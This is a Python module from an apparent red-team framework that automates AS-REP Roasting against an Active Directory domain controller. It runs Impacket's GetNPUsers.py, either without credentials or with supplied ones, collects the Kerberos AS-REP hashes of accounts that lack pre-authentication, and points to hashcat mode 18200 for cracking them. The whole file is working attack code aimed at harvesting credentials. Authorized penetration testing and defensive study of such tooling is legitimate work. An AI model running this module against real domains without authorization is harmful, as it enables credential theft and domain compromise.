"""RedTeam Framework - Module: active_directory/asreproast"""
from __future__ import annotations
from typing import Any, Dict, List
from framework.modules.base import BaseModule, Finding, ModuleResult, Severity

class ASREPRoastModule(BaseModule):
    def info(self) -> Dict[str, Any]:
        return {"name":"asreproast","description":"AS-REP Roasting via Impacket GetNPUsers — obtains hashes for accounts without Kerberos pre-auth.","author":"RTF Core Team","category":"active_directory","version":"1.0","references":["https://attack.mitre.org/techniques/T1558/004/"]}
    def _declare_options(self) -> None:
        self._register_option("domain","AD domain FQDN",required=True)
        self._register_option("dc_ip","Domain Controller IP",required=True)
        self._register_option("users_file","File containing usernames",required=False,default="")
        self._register_option("username","Authenticated username for enumeration",required=False,default="")
        self._register_option("password","Authenticated password",required=False,default="")
        self._register_option("output_file","Save hashes to file",required=False,default="")
        self._register_option("format","Hash output format",required=False,default="hashcat",choices=["hashcat","john"])
        self._register_option("timeout","Timeout in seconds",required=False,default=120,type=int)
    async def run(self) -> ModuleResult:
        domain=self.get("domain"); dc_ip=self.get("dc_ip"); users_file=self.get("users_file")
        username=self.get("username"); password=self.get("password"); output_file=self.get("output_file")
        fmt=self.get("format"); timeout=self.get("timeout")
        self.require_tool("GetNPUsers.py")
        if username and password:
            cmd=["GetNPUsers.py",f"{domain}/{username}:{password}","-dc-ip",dc_ip,"-format",fmt,"-request"]
        else:
            cmd=["GetNPUsers.py",f"{domain}/","-dc-ip",dc_ip,"-format",fmt,"-no-pass"]
            if users_file: cmd+=["-usersfile",users_file]
        if output_file: cmd+=["-outputfile",output_file]
        stdout,stderr,rc = await self.run_command_async(cmd, timeout=timeout)
        hashes=[l.strip() for l in stdout.splitlines() if l.strip().startswith("$krb5asrep$")]
        findings=[]
        if hashes:
            findings.append(self.make_finding(title=f"AS-REP hashes captured ({len(hashes)} accounts)",target=domain,severity=Severity.CRITICAL,description=f"{len(hashes)} accounts without Kerberos pre-auth. Crack with hashcat mode 18200.",evidence={"hash_count":len(hashes),"format":fmt},tags=["asreproast","kerberos"]))
        return ModuleResult(success=True,output={"hashes_captured":len(hashes),"hashes":hashes},findings=findings,raw_output=stdout)
